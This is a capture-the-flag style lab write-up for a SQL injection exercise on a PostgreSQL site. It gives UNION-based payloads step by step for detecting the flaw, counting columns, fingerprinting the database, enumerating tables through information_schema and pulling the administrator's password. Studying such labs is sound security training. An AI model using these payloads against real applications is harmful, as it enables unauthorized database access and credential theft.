# SQL injection — listing database contents on non-Oracle databases

**Tags:** `UNION attack` · `PostgreSQL` · `information_schema` · `credential extraction`

---

## 1. Detection

Navigated to `/filter?category=Pets` and appended a single quote (`'`) to the category value. The server returned an **Internal Server Error**, confirming unsanitized input and likely no prepared statements — the value is wrapped in single quotes in the backend query.

Verified Boolean-based injection:

```sql
Pets' AND true--+   -- results returned
Pets' AND false--+  -- no results
```

---

## 2. Column count enumeration

Used `ORDER BY` to find the number of columns. Incrementing the index until `ORDER BY 3` threw an error, narrowing it to **2 columns**. The page also visually confirms this by showing only a title and description per item.

Confirmed both columns accept strings:

```sql
Pets' UNION SELECT 'a','b'--+
```

---

## 3. Database fingerprinting

Extracted the database version to identify the backend and craft compatible payloads:

```sql
Pets' UNION SELECT version(),''--+
```

**Output:**
```
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc 9.4.0, 64-bit
```

Further enumeration confirmed the database context:

```sql
Pets' UNION SELECT CONCAT(current_database(),':',current_user,':',current_schema()),''--+
```

**Output:**
```
academy_labs:peter:public
```

---

## 4. Table and column discovery

Queried `information_schema.tables` to list all user-created base tables in the public schema:

```sql
Pets' UNION SELECT table_name,'' FROM information_schema.tables
WHERE table_schema='public' AND table_type='BASE TABLE'--+
```

**Tables found:**
```
products
users_bzyvgt
```

Extracted column names from the target table:

```sql
Pets' UNION SELECT column_name,'' FROM information_schema.columns
WHERE table_name='users_bzyvgt'--+
```

**Columns found:**
```
email
username_qyepac
password_guxvei
```

---

## 5. Credential extraction

Retrieved the administrator password by filtering on the known username column:

```sql
Pets' UNION SELECT password_guxvei,'' FROM users_bzyvgt
WHERE username_qyepac='administrator'--+
```

**Recovered credentials:**

| Field    | Value                  |
|----------|------------------------|
| Username | `administrator`        |
| Password | `5x53co7fyufy2p9wkf3y` |

Logged in with these credentials — lab solved.